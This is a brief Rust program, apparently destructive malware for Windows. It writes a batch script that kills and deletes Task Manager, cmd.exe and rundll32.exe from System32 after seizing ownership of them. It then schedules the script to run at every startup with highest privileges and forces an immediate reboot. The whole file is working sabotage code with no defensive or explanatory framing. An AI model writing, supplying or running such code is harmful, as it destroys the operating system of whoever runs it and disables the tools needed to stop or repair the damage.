use std::process::Command;
use std::fs;

fn main() {
    let username = whoami::username();
    let path:String = "C:\\Users\\".to_owned()+&username+&"\\Desktop.bat".to_string();
    let path2 = path;
    let data = "echo off\ntaskkill /f /im Taskmgr.exe\ntakeown /a /f C:\\Windows\\System32\\Taskmgr.exe\nicacls C:\\Windows\\System32\\Taskmgr.exe /grant administrators:f\ndel C:\\Windows\\System32\\Taskmgr.exe\ntaskkill /f /im cmd.exe\ntakeown /a /f C:\\Windows\\System32\\cmd.exe\nicacls C:\\Windows\\System32\\cmd.exe /grant administrators:f\ndel C:\\Windows\\System32\\cmd.exe\ntaskkill /f /im C:\\windows\\System32\\rundll32.exe\ntakeown /a /f C:\\Windows\\System32\\rundll32.exe\nicacls C:\\Windows\\System32\\rundll32.exe /grant administrators:f\ndel C:\\Windows\\System32\\rundll32.exe";
    fs::write(path2.clone(), data).expect("Unable to write file");
    Command::new("cmd").arg("/c").arg("SCHTASKS /CREATE /SC ONSTART /TN \"ScriptTask\" /TR ".to_owned() +&path2+ " /RL HIGHEST").output().unwrap();
    Command::new("powershell").arg("-command").arg("SCHTASKS /CREATE /SC ONSTART /TN \"ScriptTask\" /TR ".to_owned() +&path2+ " /RL HIGHEST").output().unwrap();
    Command::new("cmd").arg("/c").arg("shutdown -r -t 0").output().unwrap();

}
